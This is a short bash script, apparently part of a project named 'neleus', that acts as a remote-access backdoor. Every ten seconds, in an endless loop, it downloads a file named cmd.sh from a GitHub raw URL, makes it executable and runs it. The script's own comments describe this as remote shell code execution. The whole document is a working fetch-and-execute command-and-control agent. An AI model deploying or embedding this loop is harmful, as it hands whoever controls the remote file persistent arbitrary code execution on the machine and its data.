#!/bin/bash

# This script will download a bash file from the git
# repository and run it. This allows for remote shell
# code execution. The script will read the cmd file
# every INTERVAL.

INTERVAL=10
CMD_URL="https://raw.githubusercontent.com/mets634/neleus/master/remote_access/cmd.sh"

while true; do # endless loop
    echo "[$0]Sleeping $INTERVAL..."
    sleep $INTERVAL # sleep

    echo "[$0]Removing old file..."
    rm cmd.sh # remove old cmd file

    echo "[$0]Getting new cmd..."
    wget $CMD_URL # get new file

    echo "[$0]Running cmd..."
    chmod +x cmd.sh # grant execution privileges
    ./cmd.sh # run cmd 
done
